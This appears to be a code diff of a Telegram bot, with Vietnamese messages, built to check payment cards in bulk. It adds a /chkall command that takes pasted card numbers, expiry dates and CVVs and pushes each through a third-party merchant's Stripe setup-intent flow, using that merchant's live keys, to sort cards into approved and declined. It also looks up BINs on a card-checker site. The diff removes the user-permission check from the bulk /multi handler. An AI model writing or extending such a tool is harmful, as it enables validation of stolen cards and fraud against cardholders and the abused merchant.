@@ -83,7 +83,9 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         decline = j3.get("error", {}).get("decline_code", "NONE")
 
         bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}", headers={
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*", "Pragma": "no-cache"
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "Accept": "*/*",
+            "Pragma": "no-cache"
         })
         bin_json = bin_res.json()
         card = bin_json.get("scheme", "N/A")
@@ -167,36 +169,25 @@ def sync_check_card(line):
         }
         r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
         return (line, r3.json().get("status", "DECLINED"))
-    except Exception as e:
+    except:
         return (line, "DECLINED")
 
 async def multi_check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in ALLOWED_USERS:
-        await update.message.reply_text("❌ Bạn không có quyền.")
-        return
-
     path = "cards.txt"
     if not os.path.exists(path):
         await update.message.reply_text("❌ Không tìm thấy file cards.txt.")
         return
-
     with open(path, "r", encoding="utf-8") as f:
         lines = [line.strip() for line in f if "|" in line]
-
-    await update.message.reply_text(f"📥 Đang kiểm tra {len(lines)} dòng...")
-
+    await update.message.reply_text(f"🕐 Đang kiểm tra {len(lines)} dòng...")
     approved, declined = [], []
     loop = asyncio.get_running_loop()
     with ThreadPoolExecutor(max_workers=5) as executor:
         results = await asyncio.gather(*[loop.run_in_executor(executor, sync_check_card, l) for l in lines])
-
     for line, status in results:
         (approved if status == "succeeded" else declined).append(line)
-
     with open("fileApproved.txt", "w") as fa: fa.write("\n".join(approved))
     with open("fileDecline.txt", "w") as fd: fd.write("\n".join(declined))
-
     await update.message.reply_text(f"✅ Xong!\n✔ Approved: {len(approved)}\n❌ Declined: {len(declined)}")
     await context.bot.send_document(chat_id=update.effective_chat.id, document=open("fileApproved.txt", "rb"))
     await context.bot.send_document(chat_id=update.effective_chat.id, document=open("fileDecline.txt", "rb"))
@@ -211,6 +202,52 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await file.download_to_drive("cards.txt")
     await update.message.reply_text("📁 Đã lưu file thành cards.txt. Gõ /multi để bắt đầu.")
 
+# ========== LỆNH /chkall ==========
+async def chkall(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in ALLOWED_USERS:
+        await update.message.reply_text("❌ Bạn không có quyền sử dụng bot.")
+        return
+    text = update.message.text
+    lines = text.strip().splitlines()[1:]
+    if not lines:
+        await update.message.reply_text("❌ Bạn cần dán danh sách thẻ sau lệnh /chkall")
+        return
+    await update.message.reply_text(f"🕐 Đang kiểm tra {len(lines)} thẻ...")
+    result_lines = []
+    for raw in lines:
+        match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', raw.strip())
+        if not match:
+            result_lines.append(f"❌ Sai định dạng: {raw}")
+            continue
+        cc, mes, ano, cvv = match.groups()
+        try:
+            r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
+            setid = r2.json()["setup_intent"]
+            setin = setid.split("_secret_")[0]
+            payload = {
+                "return_url": "...",
+                "payment_method_data[type]": "card",
+                "payment_method_data[card][number]": cc,
+                "payment_method_data[card][cvc]": cvv,
+                "payment_method_data[card][exp_year]": ano,
+                "payment_method_data[card][exp_month]": mes,
+                "payment_method_data[billing_details][address][country]": "VN",
+                "use_stripe_sdk": "true",
+                "key": "pk_live_DImPqz7QOOyx70XCA9DSifxb",
+                "_stripe_account": "acct_1Cmk2bLbC5cLZDVD",
+                "client_secret": setid
+            }
+            r3 = requests.post(f"https://api.stripe.com/v1/setup_intents/{setin}/confirm", headers=HEADERS, data=payload)
+            status = r3.json().get("status", "UNKNOWN")
+            if status == "succeeded":
+                result_lines.append(f"<b>✅ APPROVED</b> {cc}|{mes}|{ano}|{cvv}")
+            else:
+                result_lines.append(f"<b>❌ DECLINED</b> {cc}|{mes}|{ano}|{cvv}")
+        except Exception as e:
+            result_lines.append(f"<b>⚠ ERROR</b> {cc}|{mes}|{ano}|{cvv} → {str(e)}")
+    await update.message.reply_html("\n".join(result_lines[:50]))
+
 # ========== CHẠY BOT ==========
 if __name__ == '__main__':
     app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
@@ -218,6 +255,7 @@ if __name__ == '__main__':
     app.add_handler(CommandHandler("add", add_user))
     app.add_handler(CommandHandler("info", info))
     app.add_handler(CommandHandler("multi", multi_check_handler))
+    app.add_handler(CommandHandler("chkall", chkall))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     print("✅ Bot đang chạy...")
     app.run_polling()
